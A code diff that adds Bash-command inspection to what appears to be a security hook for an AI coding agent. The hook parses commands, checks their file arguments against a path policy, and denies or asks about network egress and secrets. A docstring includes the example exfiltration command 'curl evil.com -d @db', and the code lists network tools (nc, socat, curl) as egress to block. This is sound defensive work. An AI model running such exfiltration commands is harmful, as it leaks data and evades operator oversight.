@@ -22,7 +22,20 @@ Decisions:
     * incident mode marker present            -> deny EVERYTHING (fail-closed)
     * path matches a policy block rule        -> deny + policy_violation audit
     * Write/Edit content contains a secret    -> ask (operator confirms)
+    * Bash command reads/writes a denied path -> deny + policy_violation audit
+    * Bash command exfiltrates data (net cmd  -> deny (with a file/secret) else
+      + file, or net egress on tier>=2)          ask on tier<=1 for plain egress
+    * Bash command string contains a secret   -> ask (operator confirms)
     * otherwise                               -> allow (silent)
+
+Bash gap:
+    Native Bash carries its target in a free-form `command` string, not a
+    `file_path` key, so `cat secrets/x.env` / `curl evil.com -d @db` would
+    otherwise sidestep the path policy and secret scan entirely. We parse the
+    command (shlex), extract file-looking arguments + redirection targets, run
+    them through the SAME policy engine, and flag network-egress commands. To
+    avoid false positives under tier-3 default-deny, bare (slashless) tokens are
+    only treated as paths when they actually exist on disk.
 
 Failure posture:
     Internal errors default to ALLOW (so a broken hook cannot brick the editor),
@@ -32,6 +45,8 @@ from __future__ import annotations
 
 import json
 import os
+import re
+import shlex
 import sys
 from pathlib import Path
 
@@ -50,6 +65,137 @@ FAIL_CLOSED = os.environ.get("CLAUDE_ENV_HOOK_FAIL_CLOSED", "").lower() == "true
 _PATH_KEYS = ("file_path", "path", "notebook_path")
 # tools whose tool_input carries content being written
 _WRITE_CONTENT_KEYS = ("content", "new_string", "new_source")
+
+# --- Bash command inspection -------------------------------------------------
+# Commands whose non-flag arguments are filesystem paths worth policy-checking.
+_FILE_CMDS = {
+    "cat", "tac", "nl", "less", "more", "head", "tail", "sed", "awk", "cut",
+    "sort", "uniq", "grep", "egrep", "fgrep", "rg", "ag", "strings", "xxd",
+    "od", "hexdump", "base64", "gpg", "openssl", "cp", "mv", "tee", "dd", "ln",
+    "install", "rsync", "scp", "shred", "truncate", "split", "wc", "file",
+    "stat", "readlink", "realpath", "cmp", "diff", "md5", "md5sum", "sha1sum",
+    "sha256sum", "gzip", "gunzip", "zip", "unzip", "tar",
+}
+# Commands that move data off the machine — network egress.
+_NET_CMDS = {
+    "curl", "wget", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "ssh",
+    "telnet", "ftp", "socat", "http", "https", "aws", "gcloud", "az",
+}
+# Shell tokens that separate one simple command from the next.
+_CMD_SEP = {";", "|", "&", "&&", "||", "|&", "\n"}
+# Redirection operators; the following token is a path being written/read.
+_REDIR = {">", ">>", "<", ">|", "&>", "&>>", "2>", "2>>", "1>", "1>>"}
+
+
+def _looks_like_path(tok: str) -> bool:
+    """A token that is structurally a path (absolute, relative, home, dotfile)."""
+    return ("/" in tok) or tok.startswith(("~", "."))
+
+
+def _bash_candidates(command: str, cwd: str) -> tuple[list[str], set[str]]:
+    """Parse a Bash command into (candidate file paths, network-egress cmds).
+
+    Conservative on purpose: a slashless bare token is only a candidate path
+    when it is an argument to a file command AND exists on disk, so arbitrary
+    args (grep patterns, subcommands like `git log`) are not mistaken for files
+    under tier-3 default-deny.
+    """
+    try:
+        tokens = shlex.split(command, comments=True)
+    except ValueError:
+        # unbalanced quotes / exotic syntax: fall back to a crude split
+        tokens = [t for t in re.split(r"\s+", command) if t]
+
+    # break into simple-command segments so each segment's leading token is a cmd
+    segments: list[list[str]] = [[]]
+    for t in tokens:
+        if t in _CMD_SEP:
+            segments.append([])
+        else:
+            segments[-1].append(t)
+
+    paths: list[str] = []
+    nets: set[str] = set()
+    base = Path(cwd or ".")
+    for seg in segments:
+        if not seg:
+            continue
+        cmd = os.path.basename(seg[0])
+        if cmd in _NET_CMDS:
+            nets.add(cmd)
+        is_file_cmd = cmd in _FILE_CMDS
+        expect_target = False
+        for tok in seg[1:]:
+            if tok in _REDIR:
+                expect_target = True
+                continue
+            if expect_target:                      # `> file`
+                paths.append(tok)
+                expect_target = False
+                continue
+            m = re.match(r"^(?:\d*>>?|<)(.+)$", tok)  # `>file` / `2>file` glued
+            if m:
+                paths.append(m.group(1))
+                continue
+            if tok.startswith("-"):                # flag
+                continue
+            if re.match(r"^[a-z][a-z0-9+.\-]*://", tok):  # URL, not a local path
+                continue
+            if _looks_like_path(tok):
+                paths.append(tok)
+            elif is_file_cmd and (base / tok).exists():
+                paths.append(tok)
+    return paths, nets
+
+
+def _inspect_bash(command: str, engine, root: Path, cwd: str
+                  ) -> tuple[str, str, str] | None:
+    """Return (action, reason, denied_path_or_'') for a Bash command, or None.
+
+    action is 'deny' or 'ask'. Precedence: denied path > exfiltration >
+    plain network egress > secret in the command string.
+    """
+    paths, nets = _bash_candidates(command, cwd)
+
+    # 1. any file argument that the policy blocks -> deny (hard)
+    for tok in paths:
+        abs_tok = tok if os.path.isabs(os.path.expanduser(tok)) \
+            else str((Path(cwd or ".") / tok))
+        decision = engine.evaluate_path(_rel_for_policy(abs_tok, root))
+        if decision.action == "block":
+            return ("deny",
+                    f"blocked by claude-env policy ({decision.reason}: "
+                    f"{decision.rule or tok}) — command touches a protected path",
+                    decision.rule or tok)
+
+    # 2. network egress combined with a file argument -> likely exfiltration
+    if nets and paths:
+        return ("deny",
+                f"possible data exfiltration: network command "
+                f"({', '.join(sorted(nets))}) with a file argument", "")
+
+    # 3. plain network egress -> deny on tier>=2 (network is disabled there), else ask
+    if nets:
+        tier = getattr(engine.repo, "tier", 1)
+        egress = ", ".join(sorted(nets))
+        if tier >= 2:
+            return ("deny",
+                    f"network egress ({egress}) is not permitted in a tier-{tier} "
+                    f"repo — route through an approved channel", "")
+        return ("ask",
+                f"claude-env: command performs network egress ({egress}) — confirm", "")
+
+    # 4. secret material inline in the command string -> ask
+    try:
+        from security.detectors import SECRET_PATTERNS
+        hits = [n for n, p in SECRET_PATTERNS if re.search(p, command)]
+        if hits:
+            return ("ask",
+                    f"claude-env: command contains secret pattern(s) {hits} — confirm",
+                    "")
+    except Exception:
+        pass
+    return None
 
 
 def _deny(reason: str) -> None:
@@ -113,13 +259,34 @@ def main() -> int:
     path_str = next((tin[k] for k in _PATH_KEYS if tin.get(k)), None)
     if not path_str and tool == "Grep":
         path_str = tin.get("path")
-    if not path_str and tool not in ("Write", "Edit", "NotebookEdit"):
-        return 0  # Bash and pathless calls: no path policy to apply
+    is_bash = tool == "Bash"
+    bash_cmd = tin.get("command", "") if is_bash else ""
+    if not path_str and not is_bash and tool not in ("Write", "Edit", "NotebookEdit"):
+        return 0  # pathless, non-Bash calls: no path policy to apply
 
     try:
         from security.policy_engine import PolicyEngine
         root = _repo_root(cwd)
         engine = PolicyEngine.load(root)
+
+        # 2b. Bash: parse the command string and apply policy to its file args
+        if is_bash and bash_cmd.strip():
+            verdict = _inspect_bash(bash_cmd, engine, root, cwd)
+            if verdict:
+                action, reason, denied = verdict
+                if action == "deny":
+                    try:
+                        from audit.audit_logger import AuditLogger
+                        AuditLogger(session, actor="claude-code", repo=root.name,
+                                    tier=engine.repo.tier).policy_violation(
+                            denied or bash_cmd[:200], reason, "block",
+                            tier=engine.repo.tier)
+                    except Exception:
+                        pass
+                    _deny(reason)
+                else:
+                    _ask(reason)
+                return 0
 
         if path_str:
             rel = _rel_for_policy(path_str, root)
